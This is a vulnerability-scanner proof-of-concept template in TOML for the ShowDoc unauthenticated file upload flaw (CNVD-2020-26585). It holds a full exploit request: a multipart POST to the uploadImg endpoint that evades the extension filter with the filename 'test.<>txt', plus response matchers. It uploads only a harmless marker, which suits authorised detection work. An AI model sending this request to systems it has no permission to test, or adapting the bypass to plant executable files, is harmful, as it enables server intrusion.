[info]
id = "POC-AVE-2026-0037"
name = "ShowDoc 文件上传漏洞 PoC"
author = "AVE"
severity = "critical"
tags = ["file-upload", "cnvd-2020-26585", "showdoc"]
description = "ShowDoc 2.8.6 以下版本 /index.php?s=/home/page/uploadImg 接口存在未授权任意文件上传漏洞，通过构造特制 multipart 请求可上传任意文件到服务器。"
vuln_id = ["CNVD-2020-26585", "AVE-2026-0037"]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/index.php?s=/home/page/uploadImg"

[poc.requests.headers]
Content-Type = "multipart/form-data; boundary=----AVEFormBoundary"

[poc.requests.body]
type = "raw"
content = "------AVEFormBoundary\r\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>txt\"\r\nContent-Type: text/plain\r\n\r\nAVEVulnerabilityTest\r\n------AVEFormBoundary--"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["Uploads"]
expect = true
